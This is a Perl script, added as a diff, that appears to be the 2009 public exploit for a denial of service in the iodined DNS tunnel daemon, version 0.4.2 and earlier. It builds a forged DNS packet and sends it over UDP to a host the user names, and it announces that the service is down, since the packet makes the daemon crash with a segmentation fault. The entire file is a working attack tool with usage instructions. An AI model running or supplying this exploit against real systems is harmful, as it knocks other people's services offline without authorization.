@@ -1,0 +1,58 @@
+#!/usr/bin/perl
+
+# iodined <= 0.4.2 DoS exploit
+#
+# by Albert Sellares <whats[at]wekk[dot]net> 
+# http://www.wekk.net
+# 2009-04-26
+#
+# This exploit shuts down the iodined daemon using a forged DNS packet.
+# It works on the last debian stable version (0.4.2-2).
+#
+# It produces a segmentation fault on the daemon side.
+
+use IO::Socket;
+use strict;
+
+my $pkt_header = "\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x0b\x56\x63\x61\x61\x61\x69\x61\x71\x61\x61\x64";
+my $pkt_footer = "\x00\x00\x0a\x00\x01\x00\x00\x29\x10\x00\x00\x00\x80\x00\x00\x00";
+
+if ($#ARGV != 1) {
+    print "shoot-iodined <= 0.4.2 - <whats[\@t]wekk.net>\n".
+          "=============================================\n".
+          "Usage: ./shoot-iodined host domain\n".
+          " * host: Host addr where iodined is listening\n".
+          " * domain: Domain that iodined is using\n";
+    exit 1;
+}
+
+my $host = $ARGV[0];
+my $domain = $ARGV[1];
+my $template = 'a24';
+my @pkt;;
+my $l;
+
+push(@pkt, $pkt_header);
+my @chunk = split(/\./, $domain);
+
+foreach (@chunk) {
+    $l = length $_;
+    $template = $template . 'Ca'. $l;
+    push(@pkt, $l);
+    push(@pkt, $_);
+}
+$template = $template . 'a16';
+push(@pkt, $pkt_footer);
+
+$| = 1;
+print " [*] Shooting iodined at host $host...\n";
+
+my $sock = IO::Socket::INET->new(  Proto     => 'udp',
+                                   PeerPort  => 53,
+                                   PeerAddr  => $host) or die "Creating socket: $!\n";
+
+$sock->send(pack($template, @pkt)) or die "send: $!";
+
+print " [*] If the domain was ok, now the service is down.\n";
+
+# milw0rm.com [2009-04-27]
